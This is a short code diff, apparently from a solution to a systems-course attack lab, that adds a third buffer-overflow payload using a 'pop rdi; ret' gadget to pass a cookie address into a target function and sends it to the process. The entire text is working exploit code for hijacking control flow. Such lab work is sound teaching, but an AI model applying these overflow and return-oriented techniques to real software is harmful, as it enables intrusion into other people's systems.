@@ -12,9 +12,13 @@ touch1 = 0x4017C0
 touch2 = 0x4017EC
 pop_rdi_ret = 0x40141b
 cookie = 0x59b997fa
+cookie_addr = 0x6044E4
+
+touch3 = 0x4018FA
 
 payload1 = padding + s64(touch1)
 payload2 = padding + s64(pop_rdi_ret) + s64(cookie) + s64(touch2)
+payload3 = padding + s64(pop_rdi_ret) + s64(cookie_addr) + s64(touch3)
 
-p.sendline(payload1)
+p.sendline(payload3)
 p.interactive()
